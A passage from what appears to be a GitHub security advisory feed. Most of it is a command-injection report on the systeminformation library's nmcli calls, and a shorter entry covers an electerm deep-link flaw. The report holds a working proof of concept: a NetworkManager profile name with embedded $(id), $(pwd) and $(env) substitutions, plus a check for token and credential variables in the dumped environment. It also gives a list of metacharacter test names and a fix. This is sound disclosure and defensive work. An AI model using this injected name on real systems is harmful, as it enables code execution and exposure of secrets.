<pre><code class="language-js">const cmd = `nmcli connection show "${connectionName}" 2&gt;/dev/null | grep ipv4.method;`;
</code></pre>
<p><strong>Sink 2:</strong> <a href="https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L660-L660"><code>lib/network.js:660</code></a></p>
<pre><code class="language-js">const cmd = `nmcli connection show "${connectionName}" 2&gt;/dev/null | grep ipv4.dns-search;`;
</code></pre>
<p><strong>Sink 3:</strong> <a href="https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L676-L676"><code>lib/network.js:676</code></a></p>
<pre><code class="language-js">const cmd = `nmcli connection show "${connectionName}" 2&gt;/dev/null | grep 802-1x.eap;`;
</code></pre>
<p>There are <strong>three distinct exploitable <code>connectionName</code> sinks</strong>.</p>
<h2 id="proof-of-concept-poc--reproduction-steps">Proof of Concept (PoC) &amp; Reproduction Steps</h2>
<p>The following PoC is harmless and local-only. It uses a dummy NetworkManager connection and writes proof files under /tmp.</p>
<p>Run from the project root:</p>
<pre><code class="language-bash">cd /path/to/systeminformation
</code></pre>
<p>Confirm proof files do not already exist:</p>
<pre><code class="language-bash">test -e /tmp/si-nm-id-proof &amp;&amp; echo EXISTS || echo NOT_YET
test -e /tmp/si-nm-pwd-proof &amp;&amp; echo EXISTS || echo NOT_YET
test -e /tmp/si-nm-env-proof &amp;&amp; echo EXISTS || echo NOT_YET
</code></pre>
<p>Create a malicious NetworkManager dummy profile:</p>
<pre><code class="language-bash">nmcli connection add type dummy ifname si-nmghsa0 con-name 'si-ghsa$(id&gt;/tmp/si-nm-id-proof)$(pwd&gt;/tmp/si-nm-pwd-proof)$(env&gt;/tmp/si-nm-env-proof)'
</code></pre>
<p>Assign a documentation-only address so Node’s os.networkInterfaces() sees the dummy interface:</p>
<pre><code class="language-bash">nmcli connection modify 'si-ghsa$(id&gt;/tmp/si-nm-id-proof)$(pwd&gt;/tmp/si-nm-pwd-proof)$(env&gt;/tmp/si-nm-env-proof)' \
  ipv4.method manual \
  ipv4.addresses 192.0.2.253/32 \
  ipv6.method disabled
</code></pre>
<p>Activate the profile:</p>
<pre><code class="language-bash">nmcli connection up 'si-ghsa$(id&gt;/tmp/si-nm-id-proof)$(pwd&gt;/tmp/si-nm-pwd-proof)$(env&gt;/tmp/si-nm-env-proof)'
</code></pre>
<p>Confirm real nmcli exposes the malicious connection name unchanged:</p>
<pre><code class="language-bash">nmcli device status | grep si-nmghsa0
</code></pre>
<p>Expected relevant output includes the active connection name:</p>
<pre><code class="language-text">si-nmghsa0  dummy  connected  si-ghsa$(id&gt;/tmp/si-nm-id-proof)$(pwd&gt;/tmp/si-nm-pwd-proof)$(env&gt;/tmp/si-nm-env-proof)
</code></pre>
<p>Trigger the vulnerable library path with no attacker-controlled function argument:</p>
<pre><code class="language-bash">node -e "const si=require('./lib'); si.networkInterfaces().then((interfaces)=&gt;{const item=interfaces.find((entry)=&gt;entry.iface==='si-nmghsa0'); console.log('saw_dummy_iface=' + Boolean(item)); if (item)
console.log(JSON.stringify({iface:item.iface, ip4:item.ip4, dhcp:item.dhcp, dnsSuffix:item.dnsSuffix, ieee8021xAuth:item.ieee8021xAuth}));}).catch((e)=&gt;{console.error(e); process.exit(1);});"
</code></pre>
<p>Confirm command execution:</p>
<pre><code class="language-bash">test -e /tmp/si-nm-id-proof &amp;&amp; echo CONFIRMED || echo FAILED
cat /tmp/si-nm-id-proof
cat /tmp/si-nm-pwd-proof
</code></pre>
<p>Inspect environment key categories without printing secret values:</p>
<pre><code class="language-bash">node -e "
const fs=require('fs');
const keys=fs.readFileSync('/tmp/si-nm-env-proof','utf8')
  .split(/\n/).map(l=&gt;l.split('=')[0]).filter(Boolean);
const wanted=['PATH','USER','HOME','SHELL','PWD','SSH_AUTH_SOCK','GITHUB_TOKEN','NPM_TOKEN','AWS_ACCESS_KEY_ID'];
console.log('env_key_count='+keys.length);
console.log('present_categories='+wanted.filter(k=&gt;keys.includes(k)).join(','));
"
</code></pre>
<p>validated evidence:</p>
<pre><code class="language-text">saw_dummy_iface=true
uid=1000(smart) gid=1000(smart)
pwd=/home/smart/Downloads/systeminformation-master
env_key_count=74
present_categories=PATH,USER,HOME,SHELL,PWD,SSH_AUTH_SOCK
</code></pre>
<h2 id="local-validation-summary--aggregate-reachability">Local Validation Summary &amp; Aggregate Reachability</h2>
<p>Validation was performed against <strong>real NetworkManager</strong> and <strong>real <code>nmcli</code></strong>. The primary proof did not rely on a PATH stub.</p>
<p><strong>Observed behavior:</strong></p>
<ul>
<li>The malicious profile was accepted by NetworkManager.</li>
<li>The active connection name appeared unchanged in <code>nmcli device status</code>.</li>
<li>Calling only <code>require('./lib').networkInterfaces()</code> triggered execution.</li>
<li>The proof artifacts were created only after the library call.</li>
<li>The <code>id</code> output matched the calling Node.js process identity.</li>
<li>The <code>pwd</code> output matched the Node.js process working directory.</li>
<li>The environment proof demonstrated access to process-environment categories without printing secret values.</li>
</ul>
<p><strong>Aggregate API reachability:</strong></p>
<ul>
<li><a href="https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/index.js#L94-L94"><code>lib/index.js:94</code></a>: <code>getStaticData()</code> reaches <code>network.networkInterfaces()</code> as part of static data collection.</li>
<li><a href="https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/index.js#L307-L307"><code>lib/index.js:307</code></a>: <code>getAllData()</code> reaches <code>getStaticData()</code> first.</li>
</ul>
<p>During local validation, an aggregate runtime attempt later hit an unrelated <code>osinfo.js</code> error in that environment. Because of that, aggregate source reachability is confirmed, but aggregate call completion was <strong>not</strong> used as the primary exploit proof.</p>
<h2 id="why-this-is-not-intended-behavior">Why This Is Not Intended Behavior</h2>
<p><code>networkInterfaces()</code> is documented and expected to return network interface metadata such as interface name, IP addresses, DHCP state, DNS suffix, and IEEE 802.1X status.</p>
<p>The library already shows an intent to protect shell command construction by sanitizing interface names before shell use. The missing sanitization for <code>connectionName</code> is inconsistent with that defensive pattern.</p>
<p>Executing shell commands embedded in a NetworkManager profile name is not a documented feature, not required to return network metadata, and not an expected design tradeoff. This is a command injection vulnerability caused by unsafe shell-string construction.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Avoid shell interpolation entirely for NetworkManager calls.</p>
<p>Replace shell command strings with <code>execFileSync()</code> or <code>spawnSync()</code> using argument arrays. For example:</p>
<pre><code class="language-js">const { execFileSync } = require('child_process');

const output = execFileSync(
  'nmcli',
  ['connection', 'show', connectionName],
  util.execOptsLinux
).toString();
</code></pre>
<p><strong>Recommended code-level changes:</strong></p>
<ul>
<li>Replace <code>nmcli device status 2&gt;/dev/null | grep ${interfaceName}</code> with argument-array execution and filter rows in JavaScript.</li>
<li>Replace every <code>nmcli connection show "${connectionName}" | grep ...</code> shell string with argument-array execution.</li>
<li>Parse <code>ipv4.method</code>, <code>ipv4.dns-search</code>, and <code>802-1x.eap</code> in JavaScript instead of using shell <code>grep</code>.</li>
<li>Treat NetworkManager profile names as untrusted input even though they originate from local system state.</li>
<li>Do not rely on quoting or escaping as the main mitigation. Argument-array execution is the correct fix.</li>
</ul>
<h2 id="regression-test-ideas">Regression Test Ideas</h2>
<p>Add Linux-specific tests for NetworkManager connection names containing shell metacharacters.</p>
<p><strong>Suggested malicious connection names:</strong></p>
<ul>
<li><code>name$(...)</code></li>
<li><code>name"; ...; #</code></li>
<li>``name`...``` </li>
<li><code>name|...</code></li>
<li><code>name;...</code></li>
</ul>
<p><strong>Expected behavior after the fix:</strong></p>
<ul>
<li><code>networkInterfaces()</code> completes without executing shell syntax from the connection name.</li>
<li>No marker files or equivalent side effects are produced.</li>
<li>The function either returns metadata for the interface or safely returns unknown/default values for fields that cannot be queried.</li>
<li>Tests cover all three current sink helpers:<ul>
<li>DHCP lookup</li>
<li>DNS suffix lookup</li>
<li>IEEE 802.1x auth lookup</li>
</ul>
</li>
</ul>
<p>For unit-level coverage, mock the NetworkManager command wrapper so that <code>nmcli device status</code> returns a connection name containing metacharacters, then assert that subsequent calls use argument arrays rather than shell strings.</p>
<h2 id="credit-request">Credit request</h2>
<p>If you publish an advisory or assign a CVE, please credit me as:</p>
<p>Ali Firas (thesmartshadow)  - <a href="https://www.smartshadow.dev">https://www.smartshadow.dev</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-hvx9-hwr7-wjj9">https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-hvx9-hwr7-wjj9</a></li>
<li><a href="https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.31.6">https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.31.6</a></li>
<li><a href="https://github.com/advisories/GHSA-hvx9-hwr7-wjj9">https://github.com/advisories/GHSA-hvx9-hwr7-wjj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hvx9-hwr7-wjj9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-13T15:29:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[electerm] Electerm users can run dangrous code through link or command line]]></title>
        <id>https://github.com/advisories/GHSA-mpm8-cx2p-626q</id>
        <link href="https://github.com/advisories/GHSA-mpm8-cx2p-626q"/>
        <updated>2026-05-13T13:32:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>Arbitrary local code execution via deep links, CLI <code>--opts</code>, or crafted shortcuts. Affected users: electerm installs that accept protocol URLs or CLI options (affected versions listed in the original report). Exploit requires clicking a crafted <code>electerm://...</code> link or opening a crafted shortcut/command that launches electerm with attacker-controlled <code>opts</code>.</em></p>
<h3 id="patches">Patches</h3>
<p>Fixed in version &gt; 3.8.8</p>
<p>commits:</p>
<ul>
<li><a href="https://github.com/electerm/electerm/commit/8a6a17951e96d715f5a231532bbd8303fe208700">https://github.com/electerm/electerm/commit/8a6a17951e96d715f5a231532bbd8303fe208700</a></li>
<li><a href="https://github.com/electerm/electerm/commit/a79e06f4a1f0ac6376c3d2411ef4690fa0377742">https://github.com/electerm/electerm/commit/a79e06f4a1f0ac6376c3d2411ef4690fa0377742</a></li>
<li><a href="https://github.com/electerm/electerm/commit/0599e67069b00e376a2e962649aaad6096e63507">https://github.com/electerm/electerm/commit/0599e67069b00e376a2e962649aaad6096e63507</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Disable or unregister electerm protocol handlers (Deep Link settings) and avoid clicking <code>electerm://</code> links.</li>
<li>Do not run electerm with untrusted <code>--opts</code> arguments or open <code>.lnk</code> / <code>.desktop</code> files from untrusted sources.</li>
<li>Restrict which users can launch electerm on shared machines and avoid leaving electerm installed in locations reachable by other users.</li>
<li>As a temporary measure, run electerm in a confined account or sandbox (non-admin user) to reduce impact.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Report / credit: <a href="https://github.com/Curly-Haired-Baboon">https://github.com/Curly-Haired-Baboon</a></li>
<li>Electerm releases: <a href="https://github.com/electerm/electerm/releases">https://github.com/electerm/electerm/releases</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/electerm/electerm/security/advisories/GHSA-mpm8-cx2p-626q">https://github.com/electerm/electerm/security/advisories/GHSA-mpm8-cx2p-626q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-43944">https://nvd.nist.gov/vuln/detail/CVE-2026-43944</a></li>
<li><a href="https://github.com/electerm/electerm/commit/8a6a17951e96d715f5a231532bbd8303fe208700">https://github.com/electerm/electerm/commit/8a6a17951e96d715f5a231532bbd8303fe208700</a></li>
<li><a href="https://github.com/electerm/electerm/commit/a79e06f4a1f0ac6376c3d2411ef4690fa0377742">https://github.com/electerm/electerm/commit/a79e06f4a1f0ac6376c3d2411ef4690fa0377742</a></li>
<li><a href="https://github.com/electerm/electerm/releases/tag/v3.8.15">https://github.com/electerm/electerm/releases/tag/v3.8.15</a></li>
<li><a href="https://github.com/electerm/electerm/commit/0599e67069b00e376a2e962649aaad6096e63507">https://github.com/electerm/electerm/commit/0599e67069b00e376a2e962649aaad6096e63507</a></li>
<li><a href="https://github.com/advisories/GHSA-mpm8-cx2p-626q">https://github.com/advisories/GHSA-mpm8-cx2p-626q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mpm8-cx2p-626q</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-05-08T18:46:04.000Z</published>
    </entry>
</feed>